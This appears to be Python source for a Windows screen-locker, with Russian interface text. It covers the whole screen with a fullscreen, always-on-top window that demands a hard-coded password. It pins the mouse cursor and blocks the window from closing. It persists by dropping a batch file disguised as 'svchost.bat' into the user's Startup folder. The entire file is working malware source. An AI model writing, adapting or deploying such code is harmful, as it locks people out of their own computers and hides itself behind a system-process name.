import tkinter
from tkinter import messagebox
from getpass import getuser
import pyautogui
from os.path import realpath, dirname
import os
import sys

#=====================================================
pyautogui.FAILSAFE = False
user = getuser()

password = "79819596700"
text = "Введи пароль!"
title = "Windows заблокирован!"
color = "black"
close_text = "Не закрывай!"
password_error = "Не верно!"

window = tkinter.Tk()
window.title(title)
width, height = window.winfo_screenwidth(), window.winfo_screenheight()
#=====================================================




def startup():
    path = dirname(realpath(__file__))
    bat_path = r"C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" % user
    with open(f'{bat_path}/svchost.bat', 'w+') as bat_file:
        bat_file.write(fr'start {sys.argv[0]}')

def accept_password(psw):
    if psw == password:window.destroy()
    else:messagebox.showerror(title, password_error)
    messagebox.showerror(title, close_text)
    os.remove(r"C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\svchost.bat" % user)
    
def block():
    pyautogui.moveTo(x=0, y=0)
    window.protocol("WM_DELETE_WINDOW", block)
    window.update()


window.geometry(f'{width}x{height}')
window['bg'] = color
window.attributes('-fullscreen', True, '-topmost', True)

tkinter.Label(window, text=title, font=("Arial Bold", int(height/50)), fg ="green", bg=color).grid(column=0, row=0)
tkinter.Label(window, text=text, font=("Arial Bold", int(height/40)), fg ="green", bg=color).grid(column=0, row=1, pady=5)

input_psw = tkinter.Entry(window, width=25)
input_psw.grid(column=0, row=2, pady=5)
tkinter.Button(window, text="Проверить пароль!", background="black", foreground="green", padx="15", pady="6", command=lambda: accept_password(psw=input_psw.get())).grid(column=0, row=3, pady=15)

if __name__ == '__main__':
    startup()
    block()
    window.mainloop()

